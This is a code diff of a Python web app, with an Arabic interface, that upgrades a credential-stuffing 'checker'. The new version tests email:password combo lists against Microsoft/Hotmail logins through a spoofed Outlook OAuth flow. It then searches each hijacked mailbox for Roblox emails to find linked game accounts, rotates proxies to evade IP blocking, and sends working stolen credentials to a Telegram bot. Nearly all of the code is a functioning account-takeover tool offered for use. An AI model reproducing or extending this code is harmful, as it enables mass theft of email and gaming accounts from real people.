@@ -1,6 +1,7 @@
 import os
 import time
 import threading
+import random
 from queue import Queue, Empty
 
 import requests
@@ -18,7 +19,8 @@ STATE = {
     "logs": [],
     "bot_token": "",
     "chat_id": "",
-    "workers": 20
+    "workers": 20,
+    "proxies": []
 }
 LOCK = threading.Lock()
 STOP_FLAG = threading.Event()
@@ -47,25 +49,145 @@ def send_telegram(text):
     except Exception:
         pass
 
-def check_roblox(username, password):
-    s = requests.Session()
-    s.headers.update({"User-Agent": generate_user_agent()})
+def get_user_id(username, proxies=None):
     try:
-        r = s.post("https://auth.roblox.com/v2/login", timeout=10)
-        csrf = r.headers.get("x-csrf-token")
-        if not csrf:
-            return None
-        
-        login_data = {"ctype": "Username", "cvalue": username, "password": password}
-        r = s.post("https://auth.roblox.com/v2/login", json=login_data, headers={"x-csrf-token": csrf}, timeout=10)
-        
+        r = requests.post(
+            "https://users.roblox.com/v1/usernames/users",
+            json={"usernames": [username], "excludeBannedUsers": False},
+            timeout=10, proxies=proxies
+        )
+        if r.status_code == 200 and r.json().get("data"):
+            return r.json()["data"][0]["id"]
+    except Exception:
+        pass
+    return None
+
+def get_csrf(proxies=None):
+    s = requests.Session()
+    if proxies: s.proxies = proxies
+    try:
+        r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
+        return r.headers.get("x-csrf-token"), s
+    except Exception:
+        return None, None
+
+def get_asset_names(asset_ids, proxies=None):
+    if not asset_ids: return []
+    token, session = get_csrf(proxies)
+    if not token: return []
+    try:
+        items = [{"itemType": "Asset", "id": int(a)} for a in asset_ids]
+        r = session.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
         if r.status_code == 200:
-            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}"}
-        
-        if r.status_code == 403 and "twoStepVerificationRequired" in r.text:
-            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}", "2fa": True}
-            
+            return [i.get("name", "Unknown") for i in r.json().get("data", [])]
+    except Exception:
+        pass
+    return []
+
+def get_roblox_data(username, proxies=None):
+    uid = get_user_id(username, proxies)
+    if not uid: return None
+    try:
+        user = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=10, proxies=proxies).json()
+        friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=10, proxies=proxies).json()
+        wearing = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", timeout=10, proxies=proxies).json()
+        names = get_asset_names(wearing.get("assetIds", []), proxies)
+        return {
+            "username": username,
+            "friends": friends.get("count", 0),
+            "banned": "Yes" if user.get("isBanned", False) else "No",
+            "created": (user.get("created") or "").split("T")[0] or "Unknown",
+            "profile": f"https://www.roblox.com/users/{uid}/profile",
+            "wearing": names,
+        }
+    except Exception:
         return None
+
+def extract_roblox_user(text):
+    import re
+    patterns = [r"account:\s*([a-zA-Z0-9_]+)", r"for\s+([a-zA-Z0-9_]+)\s+and", r"for\s+([a-zA-Z0-9_]+)\."]
+    for p in patterns:
+        m = re.search(p, text, re.IGNORECASE)
+        if m: return m.group(1)
+    return None
+
+def check_hotmail(email, password, proxies=None):
+    s = requests.Session()
+    if proxies: s.proxies = proxies
+    try:
+        url = (
+            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
+            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
+            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+        )
+        r = s.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True, timeout=15)
+        
+        import re
+        ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
+        if not ppft: return None
+        urlpost = re.search(r'"urlPost":"([^"]+)"', r.text)
+        if not urlpost: return None
+        
+        data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft.group(1)}&PPSX=Passport&NewUser=1"
+        post = s.post(urlpost.group(1), data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
+        
+        if "__Host-MSAAUTHP" not in s.cookies.get_dict(): return None
+        
+        code = None
+        loc = post.headers.get("Location", "")
+        if "code=" in loc: code = loc.split("code=")[1].split("&")[0]
+        if not code: return None
+        
+        tok = requests.post(
+            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+            data={
+                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+                "grant_type": "authorization_code",
+                "code": code,
+                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
+            },
+            timeout=30, proxies=proxies
+        )
+        if tok.status_code != 200: return None
+        at = tok.json().get("access_token")
+        if not at: return None
+        
+        cid = s.cookies.get("MSPCID", "").upper()
+        if not cid: return None
+        
+        search = requests.post(
+            "https://outlook.live.com/search/api/v2/query",
+            json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]},
+            headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"},
+            timeout=30, proxies=proxies
+        )
+        if search.status_code != 200: return None
+        
+        uname = extract_roblox_user(search.text)
+        if not uname: return None
+        
+        rb = get_roblox_data(uname, proxies)
+        if not rb: return None
+        
+        return {"email": email, "password": password, "roblox": rb}
+    except Exception:
+        return None
+
+def parse_proxy(p):
+    if not p: return None
+    try:
+        if "@" in p:
+            cred, ipport = p.split("@", 1)
+            u, pw = cred.split(":", 1)
+            ip, port = ipport.split(":", 1)
+            url = f"http://{u}:{pw}@{ip}:{port}"
+        else:
+            ip, port = p.split(":", 1)
+            url = f"http://{ip}:{port}"
+        return {"http": url, "https": url}
     except Exception:
         return None
 
@@ -83,37 +205,31 @@ def worker(combo_queue):
             if ":" not in combo:
                 combo_queue.task_done()
                 continue
-            username, password = combo.split(":", 1)
+            email, password = combo.split(":", 1)
         except ValueError:
             combo_queue.task_done()
             continue
             
-        result = check_roblox(username.strip(), password.strip())
+        proxies = None
+        with LOCK:
+            if STATE["proxies"]:
+                proxies = random.choice(STATE["proxies"])
+                
+        result = check_hotmail(email, password, proxies)
         
         with LOCK:
             if result:
-                if result.get("2fa"):
-                    STATE["stats"]["2fa"] += 1
-                else:
-                    STATE["stats"]["hits"] += 1
+                STATE["stats"]["hits"] += 1
             else:
                 STATE["stats"]["bad"] += 1
                 
         if result:
-            status = "2FA (Valid)" if result.get("2fa") else "HIT (Working)"
-            log(f"{status} → {username}:{password}")
-            
-            # تصميم رسالة البوت بشكل جميل
-            msg = f"""<b>✅ ROBLOX {status}!</b>
-
-👤 <b>User:</b> <code>{result['username']}</code>
-🔑 <b>Pass:</b> <code>{result['password']}</code>
-🔗 <a href="{result['profile']}">View Profile</a>
-
-<i>Sent by ALPHA XK Checker</i>"""
+            rb = result["roblox"]
+            log(f"HIT → {email} | {rb['username']}")
+            msg = f"<b>✅ ROBLOX HIT!</b>\n\n📧 <b>Email:</b> <code>{result['email']}</code>\n🔑 <b>Pass:</b> <code>{result['password']}</code>\n👤 <b>User:</b> <code>{rb['username']}</code>\n🔗 <a href='{rb['profile']}'>View Profile</a>"
             send_telegram(msg)
         else:
-            log(f"BAD → {username}")
+            log(f"BAD → {email}")
             
         socketio.emit("stats", STATE["stats"])
         combo_queue.task_done()
@@ -128,10 +244,9 @@ def run_checker(combos, workers):
     for c in combos:
         combo_q.put(c)
         
-    # إشعار بدء التشغيل في البوت
-    send_telegram(f"<b>🚀 بدأ الصيد!</b>\n\n📁 <b>عدد الحسابات:</b> <code>{len(combos)}</code>\n⚙️ <b>الثريدات (Workers):</b> <code>{workers}</code>")
-    
+    send_telegram(f"<b>🚀 بدأ صيد روبلوكس!</b>\n\n📁 <b>عدد الحسابات:</b> <code>{len(combos)}</code>\n⚙️ <b>الثريدات:</b> <code>{workers}</code>\n🌐 <b>بروكسيات:</b> <code>{len(STATE['proxies'])}</code>")
     log(f"بدأ الفحص لـ {len(combos)} حساب...")
+    
     threads = []
     for _ in range(min(workers, max(1, len(combos)))):
         t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
@@ -142,10 +257,8 @@ def run_checker(combos, workers):
         t.join()
         
     STATE["running"] = False
-    log(f"خلصنا! صيد: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | خربان: {STATE['stats']['bad']}")
-    
-    # إشعار انتهاء التشغيل
-    send_telegram(f"<b>🏁 انتهى الصيد!</b>\n\n✅ <b>Hits:</b> {STATE['stats']['hits']}\n🔒 <b>2FA:</b> {STATE['stats']['2fa']}\n❌ <b>Bad:</b> {STATE['stats']['bad']}")
+    log(f"خلصنا! صيد: {STATE['stats']['hits']} | خربان: {STATE['stats']['bad']}")
+    send_telegram(f"<b>🏁 انتهى الصيد!</b>\n\n✅ <b>Hits:</b> {STATE['stats']['hits']}\n❌ <b>Bad:</b> {STATE['stats']['bad']}")
 
 INDEX_HTML = r"""<!doctype html>
 <html lang="ar" dir="rtl">
@@ -161,12 +274,18 @@ INDEX_HTML = r"""<!doctype html>
   .wrap { max-width:800px; margin:0 auto; padding:20px; }
   h1 { font-size:20px; text-align:center; margin-bottom:20px; text-shadow: 0 0 10px var(--fg); }
   
-  .settings { display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; }
+  .settings { display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:15px; }
   .settings input, .settings select {
     background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
-    padding: 10px; border-radius: 5px; font-family: inherit; flex: 1;
+    padding: 10px; border-radius: 5px; font-family: inherit; width: 100%;
   }
   .settings input:focus, .settings select:focus { outline: none; border-color: var(--fg); }
+  
+  .proxy-area { margin-bottom: 15px; }
+  .proxy-area textarea {
+    width: 100%; background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
+    padding: 10px; border-radius: 5px; font-family: inherit; min-height: 60px; resize: vertical;
+  }
 
   .upload-box {
     border: 2px dashed var(--dim); padding: 30px 20px; text-align: center;
@@ -178,7 +297,7 @@ INDEX_HTML = r"""<!doctype html>
   .upload-box span { font-size: 16px; pointer-events: none; display: block; color: #aaa; }
   .upload-box:hover span { color: var(--fg); }
 
-  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:20px; }
+  .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
   .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; background: var(--panel); }
   .stat b { display:block; font-size:22px; margin-top:5px; }
   .stat.hits b { color: var(--fg); text-shadow: 0 0 5px var(--fg); }
@@ -196,12 +315,18 @@ INDEX_HTML = r"""<!doctype html>
 </head>
 <body>
 <div class="wrap">
-  <h1>▶ RBX CHECKER</h1>
+  <h1>▶ ROBLOX CHECKER</h1>
   
   <div class="settings">
     <input type="password" id="bot_token" placeholder="Bot Token (تيليجرام)">
     <input type="text" id="chat_id" placeholder="Chat ID (المعرف)">
-    <input type="number" id="workers" value="20" min="1" max="100" style="max-width:80px;" title="عدد الثريدات">
+  </div>
+  <div class="settings">
+    <input type="number" id="workers" value="20" min="1" max="100" placeholder="عدد الثريدات (Workers)">
+  </div>
+  
+  <div class="proxy-area">
+    <textarea id="proxies" placeholder="ضع البروكسيات هنا (سطر لكل بروكسي)&#10;ip:port&#10;user:pass@ip:port"></textarea>
   </div>
 
   <label class="upload-box" id="drop-zone">
@@ -213,10 +338,10 @@ INDEX_HTML = r"""<!doctype html>
     <div class="stat">Total <b id="s-total">0</b></div>
     <div class="stat">Processed <b id="s-proc">0</b></div>
     <div class="stat hits">Hits <b id="s-hits">0</b></div>
-    <div class="stat bad">Bad <b id="s-bad">0</b></div>
+    <div class="stat bad" style="display:none;">Bad <b id="s-bad">0</b></div>
   </div>
 
-  <div class="term" id="term">> بانتظار الملف...<br>> تأكد من وضع التوكن والايدي فوق قبل رفع الملف.</div>
+  <div class="term" id="term">> بانتظار الملف...<br>> ضع الإعدادات والبروكسيات (إن وجدت) ثم ارفع الملف.</div>
 </div>
 
 <script>
@@ -240,9 +365,13 @@ fileInput.addEventListener("change", async (e) => {
   const token = document.getElementById("bot_token").value.trim();
   const chat = document.getElementById("chat_id").value.trim();
   const workers = parseInt(document.getElementById("workers").value) || 20;
+  const proxies = document.getElementById("proxies").value.split("\n").map(x => x.trim()).filter(Boolean);
   
   if (!token || !chat) {
     append("bad", "!! تنبيه: ما حطيت التوكن أو الايدي، البوت ما راح يرسل النتائج.");
+  }
+  if (proxies.length === 0) {
+    append("bad", "!! تنبيه: ما حطيت بروكسيات، راح ينحظر الآي بي وتطلع كلها BAD.");
   }
 
   uploadText.textContent = "⏳ جاري رفع الملف وبدء الصيد...";
@@ -253,6 +382,7 @@ fileInput.addEventListener("change", async (e) => {
   formData.append("bot_token", token);
   formData.append("chat_id", chat);
   formData.append("workers", workers);
+  formData.append("proxies", JSON.stringify(proxies));
   
   try {
     const r = await fetch("/api/upload", { method: "POST", body: formData });
@@ -272,7 +402,7 @@ fileInput.addEventListener("change", async (e) => {
 
 socket.on("log", d => {
   let cls = "";
-  if (d.line.includes("HIT") || d.line.includes("2FA")) cls = "hit";
+  if (d.line.includes("HIT")) cls = "hit";
   if (d.line.includes("BAD")) cls = "bad";
   append(cls, d.line);
 });
@@ -280,8 +410,7 @@ socket.on("log", d => {
 socket.on("stats", s => {
   document.getElementById("s-total").textContent = s.total;
   document.getElementById("s-proc").textContent = s.processed;
-  document.getElementById("s-hits").textContent = s.hits + s["2fa"];
-  document.getElementById("s-bad").textContent = s.bad;
+  document.getElementById("s-hits").textContent = s.hits;
   
   if (s.processed >= s.total && s.total > 0) {
     uploadText.textContent = "✅ خلص الصيد! تقدر ترفع ملف جديد.";
@@ -308,19 +437,23 @@ def api_upload():
     if file.filename == "":
         return jsonify({"ok": False, "error": "اسم الملف فاضي"}), 400
         
-    # استقبال الإعدادات من المتصفح
     STATE["bot_token"] = request.form.get("bot_token", "")
     STATE["chat_id"] = request.form.get("chat_id", "")
     workers = int(request.form.get("workers", 20))
+    
+    try:
+        raw_proxies = json.loads(request.form.get("proxies", "[]"))
+        STATE["proxies"] = [parse_proxy(p) for p in raw_proxies if parse_proxy(p)]
+    except:
+        STATE["proxies"] = []
         
     try:
         content = file.read().decode("utf-8", errors="ignore")
         combos = [line.strip() for line in content.splitlines() if ":" in line]
         
         if not combos:
-            return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (user:pass)"}), 400
+            return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (email:pass)"}), 400
             
-        # بدء الفحص في الخلفية
         threading.Thread(target=run_checker, args=(combos, workers), daemon=True).start()
         return jsonify({"ok": True, "total": len(combos)})
         
